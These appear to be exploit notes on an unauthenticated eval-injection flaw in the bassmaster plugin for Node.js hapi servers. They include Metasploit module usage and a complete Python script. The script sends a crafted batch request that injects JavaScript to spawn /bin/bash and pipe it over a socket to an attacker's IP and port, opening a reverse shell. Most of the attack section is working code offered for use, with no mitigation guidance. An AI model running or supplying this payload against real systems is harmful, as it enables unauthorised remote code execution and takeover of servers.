#  Bassmaster NodeJS Arbitrary JavaScript Injection Vulnerability 
- https://www.rapid7.com/db/modules/exploit/multi/http/bassmaster_js_injection/

Bassmaster Batch Arbitrary JavaScript Injection Remote Code Execution
Eval injection vulnerability in the internals.batch function in lib/batch.js in the bassmaster plugin prior to 1.5.2 for the hapi server framework for Node.js allows remote malicious users to execute arbitrary Javascript code via unspecified vectors.
This module exploits an un-authenticated code injection vulnerability in the bassmaster nodejs plugin for hapi. The vulnerability is within the batch endpoint and allows an attacker to dynamically execute JavaScript code on the server side using an eval. Note that the code uses a '\x2f' character so that we hit the match on the regex.
``` shell
msf > use exploit/multi/http/bassmaster_js_injection
      msf exploit(bassmaster_js_injection) > show targets
            ...targets...
      msf exploit(bassmaster_js_injection) > set TARGET <target-id>
      msf exploit(bassmaster_js_injection) > show options
            ...show and set options...
      msf exploit(bassmaster_js_injection) > exploit
```

## eval()
- https://www.w3schools.com/jsref/jsref_eval.asp
```javascript
let x = 10;
let y = 20;
let text = "x * y";
let result = eval(text);
```

## exploit 
```python
import requests,sys

if len(sys.argv) != 4:
    print "(+) usage: %s <target> <attacking ip address> <attacking port>" % sys.argv[0]
    sys.exit(-1)
    
target = "http://%s:8080/batch" % sys.argv[1]

cmd = "\\\\x2fbin\\\\x2fbash"

attackerip = sys.argv[2]
attackerport = sys.argv[3]

request_1 = '{"method":"get","path":"/profile"}'
request_2 = '{"method":"get","path":"/item"}'

shell = 'var net = require(\'net\'),sh = require(\'child_process\').exec(\'%s\'); ' % cmd
shell += 'var client = new net.Socket(); '
shell += 'client.connect(%s, \'%s\', function() {client.pipe(sh.stdin);sh.stdout.pipe(client);' % (attackerport, attackerip)
shell += 'sh.stderr.pipe(client);});' 

request_3 = '{"method":"get","path":"/item/$1.id;%s"}' % shell

json =  '{"requests":[%s,%s,%s]}' % (request_1, request_2, request_3)

r = requests.post(target, json)

print r.content
```
